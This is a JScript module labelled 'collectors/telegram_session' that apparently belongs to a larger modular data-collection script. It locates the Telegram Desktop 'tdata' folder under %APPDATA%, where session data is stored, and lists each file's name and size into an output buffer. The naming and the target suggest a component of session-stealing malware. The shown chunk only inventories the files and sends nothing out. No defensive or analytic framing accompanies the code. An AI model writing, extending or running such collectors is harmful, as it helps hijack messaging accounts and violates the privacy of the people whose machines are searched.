// chunk: collectors/telegram_session
// depends: core/emit_buffer, core/file_ops
// provides: collect_telegram
// format: jscript

function collect_telegram() {
    emit("\r\n=== TELEGRAM DATA ===\r\n");
    var appdata = _s.ExpandEnvironmentStrings("%APPDATA%");
    var tdata = appdata + "\\Telegram Desktop\\tdata";
    if (_fso.FolderExists(tdata)) {
        emit("  Telegram tdata: FOUND\r\n");
        var folder = _fso.GetFolder(tdata);
        var files = new Enumerator(folder.Files);
        for (; !files.atEnd(); files.moveNext()) {
            var f = files.item();
            emit("  " + f.Name + " (" + f.Size + " bytes)\r\n");
        }
    }
}
